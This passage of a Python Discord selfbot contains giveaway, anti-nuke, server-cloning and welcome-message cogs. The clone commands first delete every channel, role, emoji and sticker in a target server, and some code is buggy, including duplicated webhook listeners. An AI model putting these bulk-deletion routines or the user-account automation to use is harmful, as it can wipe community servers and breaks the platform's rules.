            return await senderror(ctx, "No valid giveaways!", ":x: All stored giveaways are invalid or deleted.")
        
        await send(ctx, "Active Giveaways", "\n".join(links))

    @commands.command(aliases=['gwhelp','giveaway'])
    async def gw(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:giveaway:1554763374259085333> | **Start Giveaway** **:** **`{prefix}gstart <time> <w_count> <prize>`**\n"
            f"<a:giveaway:1554763374259085333> | **End Giveaway** **:** **`{prefix}gend <msg_id>`**\n"
            f"<a:giveaway:1554763374259085333> | **Reroll Giveaway** **:** **`{prefix}greroll <msg_id> <w_count>`**\n"
            f"<a:giveaway:1554763374259085333> | **List Active Giveaways** **:** **`{prefix}gwlist`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Giveaway Commands__<a:crown:1554756538445336626>", description)

class AntiNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.whitelist = self.load_whitelist()
        self.file_path = "database/antinuke.json"
        self.load_antinuke_settings()        
        self.permissions = {
            1: "Ban",
            2: "Kick",
            3: "Guild Update",
            4: "Emoji Update",
            5: "Role Create",
            6: "Role Delete",
            7: "Role Update",
            8: "Channel Create",
            9: "Channel Delete",
            10: "Channel Update",
            11: "Webhook Create",
            12: "Webhook Delete",
            13: "Webhook Update",
            14: "Member Role Update",
            15: "Mention @\u200beveryone/@\u200bhere",
            16: "Bot Add"
        }
        self.off_emoji = "<:cross:1554768047724695694>"
        self.on_emoji = "<:GreenTick:1554767213825757234>"

    @staticmethod
    def load_json(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                return json.load(file)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"Error loading JSON: {e}")
            return {}

    def load_whitelist(self):
        try:
            with open("database/whitelist.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {}

    def save_whitelist(self):
        with open("database/whitelist.json", "w") as f:
            json.dump(self.whitelist, f, indent=4)


    def load_antinuke_settings(self):
        if os.path.exists(self.file_path):
            with open(self.file_path, "r") as f:
                self.antinuke_settings = json.load(f)
        else:
            self.antinuke_settings = {}

    def save_antinuke_settings(self):
        with open(self.file_path, "w") as f:
            json.dump(self.antinuke_settings, f, indent=4)

    @commands.command(aliases=['setpunish','setp'])
    async def setpunishment(self, ctx, punishment: str):
        await ctx.message.delete()
        if punishment.lower() not in ["kick", "ban", "timeout"]:
            await send(ctx, "Set Punishment", "<:cross:1554768047724695694> Invalid punishment type. Choose from `kick`, `ban`, or `timeout`." )
            return
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        self.antinuke_settings[guild_id]["punishment"] = punishment.lower()
        self.save_antinuke_settings()
        await send(ctx, "Set Punishment", f"<:discord_black:1554758471260311612>  Punishment set to `{punishment.lower()}` for this server.")

    @commands.command(aliases=['setlog'])
    async def setlogchannel(self, ctx, channel: discord.TextChannel):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        self.antinuke_settings[guild_id]["log_channel"] = channel.id
        self.save_antinuke_settings()
        await send(ctx, "Set Log Channel", f"<:discord_black:1554758471260311612>  Log channel set to {channel.mention}.")

    @commands.command()
    async def anuke(self,ctx): 
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<a:anuke:1554765540759699528> | **Enable AntiNuke** **:** **`{prefix}antinuke enable`**\n"
            f"<a:anuke:1554765540759699528> | **Disable AntiNuke** **:** **`{prefix}antinuke disable`**\n"
            f"<a:anuke:1554765540759699528> | **Set Punishment** **:** **`{prefix}setpunish [kick/ban]`**\n"
            f"<a:anuke:1554765540759699528> | **Set Log Channel** **:** **`{prefix}setlog [channel]`**\n"
            f"<a:anuke:1554765540759699528> | **Whitelist User** **:** **`{prefix}whitelist [user]`**\n"
            f"<a:anuke:1554765540759699528> | **Unwhitelist User** **:** **`{prefix}unwhitelist [user]`**\n"
            f"<a:anuke:1554765540759699528> | **Whitelisted list** **:** **`{prefix}whitelisted`**\n"
            f"<a:anuke:1554765540759699528> | **Antinuke config** **:** **`{prefix}anukeconfig`**\n"
            f"<a:anuke:1554765540759699528> | **Whitelist info** **:** **`{prefix}wlinfo [user]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Antinuke Commands__<a:crown:1554756538445336626>", description)

    @commands.command()
    async def antinuke(self, ctx, state: str):
        await ctx.message.delete()

        if state.lower() not in ["enable", "disable"]:
            await senderror(ctx, "AntiNuke", "<:cross:1554768047724695694> Invalid option. Use `enable` or `disable`.")
            return

        if state.lower() == "enable":
            msg = await ctx.send("<a:loading:1554766893611749386> Checking permissions...")
            await asyncio.sleep(1)
            permissions = {
                "Administrator": ctx.guild.me.guild_permissions.administrator,
                "Manage Server": ctx.guild.me.guild_permissions.manage_guild,
                "Kick Members": ctx.guild.me.guild_permissions.kick_members,
                "Ban Members": ctx.guild.me.guild_permissions.ban_members,
                "View Audit Log": ctx.guild.me.guild_permissions.view_audit_log
            }

            missing_perms = []
            for perm, has_perm in permissions.items():
                await msg.edit(content=f"<a:loading:1554766893611749386> Checking **{perm}** permission...")
                await asyncio.sleep(1)
                if not has_perm:
                    missing_perms.append(f"<:cross:1554768047724695694> You lack **{perm}** permission!")
            
            if missing_perms:
                await senderror(ctx, "⚠️ **Antinuke aborted**", "\n".join([""] + missing_perms + ["\n"]))
                return

            await msg.edit(content="<:discord_black:1554758471260311612> All permissions verified! Enabling AntiNuke...")
            await asyncio.sleep(1)
            
            guild_id = str(ctx.guild.id)
            self.antinuke_settings[guild_id] = {
                "enabled": True,
                "punishment": "kick",
                "log_channel": "not set"
            }
            self.save_antinuke_settings()

            await msg.delete()
            await send(ctx, "AntiNuke", f"<:discord_black:1554758471260311612> AntiNuke has been `enabled` for this server.")

        elif state.lower() == "disable":
            guild_id = str(ctx.guild.id)
            if guild_id in self.antinuke_settings:
                self.antinuke_settings[guild_id]["enabled"] = False
                self.save_antinuke_settings()
                await send(ctx, "AntiNuke", "<:discord_black:1554758471260311612> AntiNuke has been `disabled` for this server.")
            else:
                await senderror(ctx, "AntiNuke", "<:cross:1554768047724695694> AntiNuke is not enabled for this server.")

    @commands.command(aliases=['addwl','wl'])
    async def whitelist(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.guild is None:
            return
        guild_id = str(ctx.guild.id)
        user_id = str(member.id)
        if guild_id not in self.whitelist:
            self.whitelist[guild_id] = {}
        if user_id not in self.whitelist[guild_id]:
            self.whitelist[guild_id][user_id] = []
        perm_msg = "**Select permissions to whitelist:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        msg = await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}\n**Send `all` or number of permission u want to add separated with commas (e.g: 1,4,6)**")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            reply = await self.bot.wait_for("message", check=check, timeout=30)
            selected = reply.content.lower()
        except TimeoutError:
            await senderror(ctx, f"{selfbot_name}  Antinuke", "⏳ Timed out! Please try again.")
            return
        await msg.delete()
        await reply.delete()
        if selected == "all":
            self.whitelist[guild_id][user_id] = list(set(self.whitelist[guild_id][user_id] + list(self.permissions.keys())))
        else:
            try:
                selected_nums = [int(x) for x in selected.split(",") if int(x) in self.permissions]
                for num in selected_nums:
                    if num not in self.whitelist[guild_id][user_id]:
                        self.whitelist[guild_id][user_id].append(num)
            except ValueError:
                await senderror(ctx, f"{selfbot_name}  Antinuke", "<:cross:1554768047724695694> Invalid input. Use numbers separated by commas or type 'all'.")
                return
        self.save_whitelist()
        perm_msg = "**Updated Permissions:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}")

    @commands.command(aliases=['unwl','uwl'])
    async def unwhitelist(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.guild is None:
            return
        guild_id = str(ctx.guild.id)
        user_id = str(member.id)
        if guild_id not in self.whitelist:
            self.whitelist[guild_id] = {}
        if user_id not in self.whitelist[guild_id]:
            self.whitelist[guild_id][user_id] = []
        perm_msg = "**Select permissions to remove from whitelist:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        msg = await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}\n**Send `all` or number of permission u want to remove separated with commas (e.g: 1,4,6)**")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            reply = await self.bot.wait_for("message", check=check, timeout=30)
            selected = reply.content.lower()
        except TimeoutError:
            await send(ctx, f"{selfbot_name}  Antinuke", "⏳ Timed out! Please try again.")
            return
        await msg.delete()
        await reply.delete()
        if selected == "all":
            self.whitelist[guild_id].pop(user_id, None)
        else:
            try:
                selected_nums = [int(x) for x in selected.split(",") if int(x) in self.permissions]
                for num in selected_nums:
                    if num in self.whitelist[guild_id][user_id]:
                        self.whitelist[guild_id][user_id].remove(num)
            except ValueError:
                await senderror(ctx, f"{selfbot_name}  Antinuke", "<:cross:1554768047724695694> Invalid input. Use numbers separated by commas or type 'all'.")
                return
        self.save_whitelist()        
        perm_msg = "**Updated Permissions:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id].get(user_id, []) else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}")

    @commands.command(aliases=['wls','wlisted'])
    async def whitelisted(self, ctx):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        whitelist_settings = self.load_json("database/whitelist.json")
        whitelist_status = whitelist_settings.get(guild_id, {})
        if not whitelist_status:
            return await senderror(ctx, "Whitelisted Users", "<:cross:1554768047724695694> No users are whitelisted in this server.")
        whitelist_list = "\n".join(
            f"<@{user_id}> - `{perm_num}`" for user_id, perm_num in whitelist_status.items()
        )
        await send(ctx, "Whitelisted Users", whitelist_list)

    @commands.command(aliases=['winfo', 'whitelistinfo'])
    async def wlinfo(self, ctx, user: discord.Member = None):
        user = user or ctx.author
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        whitelist_settings = self.load_json("database/whitelist.json")
        whitelist_status = whitelist_settings.get(guild_id, {}).get(str(user.id), [])
        if not whitelist_status:
            return await senderror(ctx, "Whitelist Info", f"<:cross:1554768047724695694> {user.mention} is not whitelisted for any permission in this server.")       
        perm_msg = "\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id].get(user.id, []) else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, "Whitelist Info", f"Whitelisted Permissions for {user.mention}:\n{perm_msg}")            

    @commands.command()
    async def anukeconfig(self, ctx):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        antinuke_status = self.antinuke_settings[guild_id].get("enabled", False)
        punishment = self.antinuke_settings[guild_id].get("punishment", "Not Set")
        log_channel_id = self.antinuke_settings[guild_id].get("log_channel", "Not Set")
        message = (
            f"<:arrow:1554766539042062446> **Guild ID :** {guild_id}\n"
            f"<:arrow:1554766539042062446> **Status :** {'Enabled ✅' if antinuke_status else 'Disabled ❌'}\n"
            f"<:arrow:1554766539042062446> **Punishment :** {punishment}\n"
            f"<:arrow:1554766539042062446> **Log Channel :** {f'<#{log_channel_id}>' if isinstance(log_channel_id, int) else 'Not Set'}\n"
        )
        await send(ctx,"Antinuke configuration",message)


    @staticmethod
    def load_json(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                return json.load(file)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"Error loading JSON: {e}")
            return {}

    def save_antinuke_settings(self):
        with open("database/antinuke.json", "w") as f:
            json.dump(self.antinuke_settings, f, indent=4)

    async def send_log(self, guild, embed):
        guild_id = str(guild.id)
        antinuke_settings = self.load_json("database/antinuke.json")

        if guild_id in antinuke_settings and "log_channel" in antinuke_settings[guild_id]:
            channel = guild.get_channel(antinuke_settings[guild_id]["log_channel"])
            if channel:
                webhooks = await channel.webhooks()
                webhook = next((w for w in webhooks if w.name == "AntiNuke Log"), None)

                if not webhook:
                    webhook = await channel.create_webhook(name="AntiNuke Log")

                await webhook.send(embed=embed, username="AntiNuke Logs", avatar_url=self.bot.user.avatar.url)

    async def punish(self, guild, executor, action_id):
        guild_id = str(guild.id)
        antinuke_settings = self.load_json("database/antinuke.json")
        whitelist_settings = self.load_json("database/whitelist.json")

        antinuke_status = antinuke_settings.get(guild_id, {}).get("enabled", False)
        if not antinuke_status:
            return
        if executor.id == self.bot.user.id:
            return

        whitelist_status = whitelist_settings.get(guild_id, {}).get(str(executor.id), [])
        if str(action_id) in map(str, whitelist_status):
            return 
        punishment = antinuke_settings.get(guild_id, {}).get("punishment", "ban")
        action_name = {
            1: "Ban",
            2: "Kick",
            3: "Guild Update",
            4: "Emoji Update",
            5: "Role Create",
            6: "Role Delete",
            7: "Role Update",
            8: "Channel Create",
            9: "Channel Delete",
            10: "Channel Update",
            11: "Webhook Create",
            12: "Webhook Delete",
            13: "Webhook Update",
            14: "Member Role Update",
            15: "Mention @\u200beveryone/@\u200bhere",
            16: "Bot Add"

        }.get(action_id, f"Unknown ({action_id})")

        try:
            if punishment == "ban":
                await guild.ban(executor, reason="Anti-Nuke Protection")
            elif punishment == "kick":
                await guild.kick(executor, reason="Anti-Nuke Protection")
        except discord.Forbidden:
            pass

        embed = discord.Embed(
            title=f"🚨 {selfbot_name}  Antinuke 🚨",
            description=f"{executor.mention} has been punished for violating Anti-Nuke protection.",
            color=discord.Color.orange(),
        )
        embed.add_field(name="👤 Executor", value=f"{executor.mention} ({executor.id})", inline=False)
        embed.add_field(name="⚡ Action", value=action_name, inline=False)
        embed.add_field(name="🚨 Punishment", value=punishment, inline=False)
        embed.add_field(name="⚠️ Reason", value="Anti-Nuke Protection", inline=False)        
        embed.set_thumbnail(url=executor.avatar.url)
        embed.set_footer(text=f"Punished at {time()}")
        await self.send_log(guild, embed)

    async def get_audit_executor(self, guild, action_type):
        try:
            async for entry in guild.audit_logs(limit=1, action=action_type):
                if entry:
                    return entry.user
        except (discord.Forbidden, discord.HTTPException):
            pass
        return None 

    async def handle_event(self, guild, action_id, action_type):
        executor = await self.get_audit_executor(guild, action_type)
        if executor:
            await self.punish(guild, executor, action_id)

    @commands.Cog.listener()
    async def on_member_ban(self, guild, user):
        await self.handle_event(guild, 1, discord.AuditLogAction.ban)

    @commands.Cog.listener()
    async def on_member_remove(self, member):
        await self.handle_event(member.guild, 2, discord.AuditLogAction.kick)

    @commands.Cog.listener()
    async def on_guild_update(self, before, after):
        await self.handle_event(after, 3, discord.AuditLogAction.guild_update)

    @commands.Cog.listener()
    async def on_guild_emojis_update(self, guild, before, after):
        await self.handle_event(guild, 4, discord.AuditLogAction.emoji_update)

    @commands.Cog.listener()
    async def on_guild_role_create(self, role):
        await self.handle_event(role.guild, 5, discord.AuditLogAction.role_create)

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role):
        await self.handle_event(role.guild, 6, discord.AuditLogAction.role_delete)

    @commands.Cog.listener()
    async def on_guild_role_update(self, before, after):
        await self.handle_event(after.guild, 7, discord.AuditLogAction.role_update)

    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        await self.handle_event(channel.guild, 8, discord.AuditLogAction.channel_create)

    @commands.Cog.listener()
    async def on_guild_channel_delete(self, channel):
        await self.handle_event(channel.guild, 9, discord.AuditLogAction.channel_delete)

    @commands.Cog.listener()
    async def on_guild_channel_update(self, before, after):
        await self.handle_event(after.guild, 10, discord.AuditLogAction.channel_update)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 11, discord.AuditLogAction.webhook_create)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 12, discord.AuditLogAction.webhook_delete)

    @commands.Cog.listener()
    async def on_webhooks_update(self, channel):
        await self.handle_event(channel.guild, 13, discord.AuditLogAction.webhook_update)

    @commands.Cog.listener()
    async def on_member_update(self, before, after):
        if before.roles != after.roles:
            await self.handle_event(after.guild, 14, discord.AuditLogAction.member_role_update)

    @commands.Cog.listener()
    async def on_message(self, message:discord.Message):
        if "@everyone" in message.content or "@here" in message.content:
            if message.mention_everyone:
                await self.punish(message.guild,message.author,15,message)

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if member.bot:
            await self.handle_event(member.guild, 16, discord.AuditLogAction.bot_add)
class ServerCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def get_guild(self, guild_id):
        return self.bot.get_guild(guild_id) or await self.bot.fetch_guild(guild_id)

    @commands.command()
    async def copy(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()            
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"    
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                      
            f"<:copy:1554765363399364618> | **Clone Emojis** **:** **`{prefix}cemojis [from_g_id] [to_g_id]`**\n"
            f"<:copy:1554765363399364618> | **Clone Roles** **:** **`{prefix}croles [from_g_id] [to_g_id]`**\n"
            f"<:copy:1554765363399364618> | **Clone Channels** **:** **`{prefix}cchannels [from_g_id] [to_g_id]`**\n"
            f"<:copy:1554765363399364618> | **Clone Server** **:** **`{prefix}copyserver [from_g_id] [to_g_id]`**\n"
            f"<:copy:1554765363399364618> | **Steal Emoji** **:** **`{prefix}steal <emoji>`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"        
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Copy Commands__<a:crown:1554756538445336626>",content)

    @commands.command(aliases=['cemojis', 'cloneemojis'])
    async def copyemojis(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        success = 0
        if not from_guild or not to_guild:
            return await ctx.send("Invalid server ID(s). Make sure the bot is in both servers.")
        for emoji in to_guild.emojis:
            try:
                await emoji.delete()
            except Exception:
                pass
        async with aiohttp.ClientSession() as session:
            for emoji in from_guild.emojis:
                try:
                    async with session.get(str(emoji.url)) as resp:
                        if resp.status == 200:
                            image = await resp.read()
                            await to_guild.create_custom_emoji(name=emoji.name, image=image)
                            success+=1
                except Exception:
                    pass
        await send(ctx, "Copy-Emojis", f"Successfully copied {success} emojis from `{from_guild.name}` to `{to_guild.name}`.")

    @commands.command(alisas=['croles','cloneroles'])
    async def copyroles(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        if not from_guild or not to_guild:
            return await senderror(ctx, "Error", "Invalid server ID(s). Make sure the bot is in both servers.")
        for role in to_guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception:
                    pass
        existing_roles = {role.name: role for role in to_guild.roles}
        for role in reversed(from_guild.roles):
            if role.is_default():
                continue
            if role.name in existing_roles:
                continue
            await to_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        await send(ctx, "Copy-Roles", f"Successfully copied all roles from `{from_guild.name}` to `{to_guild.name}`.")
    
    @commands.command(aliases=['cchannels','clonechannels'])
    async def copychannels(self, ctx, from_guild_id: int, to_guild_id: int):
        await ctx.message.delete()
        from_guild = await self.get_guild(from_guild_id)
        to_guild = await self.get_guild(to_guild_id)
        if not from_guild or not to_guild:
            return await senderror(ctx, "Error", "Invalid server ID(s). Make sure the bot is in both servers.")
        for channel in to_guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass        
        category_mapping = {}
        for category in from_guild.categories:
            new_category = await to_guild.create_category(category.name, position=category.position)
            category_mapping[category.id] = new_category
        
        for channel in from_guild.text_channels + from_guild.voice_channels:
            overwrites = {to_guild.get_role(target.id): overwrite for target, overwrite in channel.overwrites.items() if to_guild.get_role(target.id)}
            category = category_mapping.get(channel.category_id)
            if isinstance(channel, discord.TextChannel):
                await to_guild.create_text_channel(channel.name, category=category, position=channel.position, overwrites=overwrites)
            elif isinstance(channel, discord.VoiceChannel):
                await to_guild.create_voice_channel(channel.name, category=category, position=channel.position, overwrites=overwrites)
        
        await send(ctx, "Copy-Channels", f"Successfully copied all channels from `{from_guild.name}` to `{to_guild.name}`.")

    @commands.command(aliases=['csrv', 'cserver', 'copys', 'copysrv'])
    async def copyserver(self, ctx, from_guild_id: int, target_guild_id: int):
        await ctx.message.delete()
        source_guild = self.bot.get_guild(from_guild_id)
        target_guild = self.bot.get_guild(target_guild_id)

        if not source_guild or not target_guild:
            await ctx.send("**Could not find the guild you mentioned!**", delete_after=30)
            return

        for emojis in target_guild.emojis:
            try:
                await emojis.delete()
            except Exception:
                pass
            
        for sticker in await target_guild.fetch_stickers():
            try:
                await sticker.delete()
            except Exception:
                pass

        for channel in target_guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        for role in target_guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception:
                    pass


        role_map = {}
        roles = sorted(source_guild.roles, key=lambda role: role.position, reverse=True)
        for role in roles:
            if role.name != "@everyone":
                try:
                    new_role = await target_guild.create_role(
                        name=role.name,
                        permissions=role.permissions,
                        color=role.color,
                        hoist=role.hoist,
                        mentionable=role.mentionable
                    )
                    role_map[role.id] = new_role
                except Exception:
                    pass

        category_map = {}
        for category in source_guild.categories:
            try:
                overwrites = {}
                for target, perms in category.overwrites.items():
                    if isinstance(target, discord.Role):
                        new_role = role_map.get(target.id) or target_guild.default_role
                        overwrites[new_role] = perms
                new_category = await target_guild.create_category(name=category.name, overwrites=overwrites)
                category_map[category.id] = new_category
                

                for channel in category.channels:
                    await self.clone_channel(channel, target_guild, new_category, role_map)
            except Exception:
                pass

        for channel in source_guild.channels:
            if not channel.category:
                await self.clone_channel(channel, target_guild, None, role_map)
        async with aiohttp.ClientSession() as session:
            for emoji in source_guild.emojis:
                try:
                    emoji_data = await emoji.read()
                    await target_guild.create_custom_emoji(name=emoji.name, image=emoji_data)
                
                except Exception:
                    pass
        await send(ctx, "Copy-Server", f"Successfully copied Full server from `{source_guild.name}` to `{target_guild.name}`.")

    async def clone_channel(self, channel, target_guild, category, role_map):
        try:
            overwrites = {}
            for target, perms in channel.overwrites.items():
                if isinstance(target, discord.Role):
                    new_role = role_map.get(target.id) or target_guild.default_role
                    overwrites[new_role] = perms

            if isinstance(channel, discord.TextChannel):
                await target_guild.create_text_channel(
                    name=channel.name,
                    topic=channel.topic,
                    position=channel.position,
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw,
                    overwrites=overwrites,
                    category=category
                )
            elif isinstance(channel, discord.VoiceChannel):
                await target_guild.create_voice_channel(
                    name=channel.name,
                    bitrate=channel.bitrate,
                    user_limit=channel.user_limit,
                    position=channel.position,
                    overwrites=overwrites,
                    category=category
                )
           
        except Exception:
            pass

    @commands.command(name='steal')
    async def steal(self, ctx, emoji: str = None):
        await ctx.message.delete()
        if not ctx.message.reference and not emoji:
            return await senderror(ctx, "Missing Reply", "You need to reply to a message with a custom emoji or provide one as an argument.")

        if not ctx.guild.me.guild_permissions.manage_emojis:
            return await senderror(ctx, "Permission Error", "I need the `Manage Emojis and Stickers` permission to steal emojis.")
        if ctx.message.reference:
            try:
                target_message = await ctx.channel.fetch_message(ctx.message.reference.message_id)
            except discord.NotFound:
                return await senderror(ctx, "Message Not Found", "The replied message could not be found.")

        emoji_to_steal = None

        if emoji:
            emoji_to_steal = emoji
        else:

            custom_emoji_match = re.search(r'<a?:\w+:\d+>', target_message.content)
            if custom_emoji_match:
                emoji_to_steal = custom_emoji_match.group()
            else:
                return await senderror(ctx, "Emoji Missing", "Couldn't find a custom emoji in the replied message.")

        emoji_regex = r'<(a?):(\w+):(\d+)>'
        match = re.match(emoji_regex, emoji_to_steal)

        if not match:
            return await senderror(ctx, "Invalid Emoji", "That's not a valid custom emoji from another server.")

        is_animated, name, emoji_id = match.groups()
        emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{'gif' if is_animated else 'png'}"


        async with aiohttp.ClientSession() as session:
            async with session.get(emoji_url) as response:
                if response.status != 200:
                    return await senderror(ctx, "Download Failed", "Couldn’t download the emoji image.")
                image_data = await response.read()


        try:
            new_emoji = await ctx.guild.create_custom_emoji(
                name=name,
                image=image_data
            )
        except discord.HTTPException as e:
            return await senderror(ctx, "Upload Failed", f"Failed to upload emoji: `{e}`")

        return await send(ctx, "Emoji Stolen", f"Emoji `{new_emoji.name}` was successfully added to this server!\n{new_emoji}")


class Greet(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def to_ordinal(self,n):
        n = int(n)
        if 10 <= n % 100 <= 20:
            suffix = 'th'
        else:
            suffix = {1: 'st', 2: 'nd', 3: 'rd'}.get(n % 10, 'th')
        return f"{n}{suffix}"
    
    @commands.Cog.listener()
    async def on_member_join(self, member):
        try:
            with open("database/greets.json", "r") as f:
                data = json.load(f)

            if str(member.guild.id) not in data:
                return

            guild_data = data[str(member.guild.id)]

            placeholders = {
                "{username}": member.name,
                "{mention}": member.mention,
                "{servername}": member.guild.name,
                "{time}": time(),
                "{date}": date(),
                "{membercount}": str(member.guild.member_count),
                "{usercount}": str(len([m for m in member.guild.members if not m.bot])),
                "{userplace}": self.to_ordinal(member.guild.member_count),
                "{usercreated}": member.created_at.strftime("%Y-%m-%d %H:%M:%S"),
                "{servericon}": member.guild.icon.url if member.guild.icon else "",
                "{useravatar}": str(member.display_avatar.url)
            }

            def format_field(value):
                if not isinstance(value, str):
                    return ""
                for k, v in placeholders.items():
                    value = value.replace(k, v)
                return value

            greeting_message = format_field(guild_data.get("greeting_message", ""))
            embed_status = guild_data.get("embed_status", False)
